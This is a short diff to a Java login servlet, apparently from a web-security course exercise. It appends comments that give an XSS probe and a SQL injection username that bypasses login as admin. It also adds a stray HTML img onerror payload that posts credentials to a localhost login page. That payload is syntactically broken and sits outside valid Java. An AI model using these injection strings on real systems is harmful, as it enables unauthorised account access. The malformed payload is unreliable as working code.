@@ -63,3 +63,10 @@ public class LoginServlet extends HttpServlet {
 		}
 	}
 }
+
+
+//XSS - <script>alert("test")</script> in search box
+//SQL Injection: set username to:  1' or 1=1 -- -     and you will be logged in as admin
+//
+
+<img src="gdfgdfgdg.jpg" onerror="var xhr = new XMLHttpRequest();xhr.open(\'POST\', 'http://localhost:8080/DAT152Application/login', true);xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');xhr.onreadystatechange = function() { if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {xhr.send(\\'user=test1&password=password');}}">
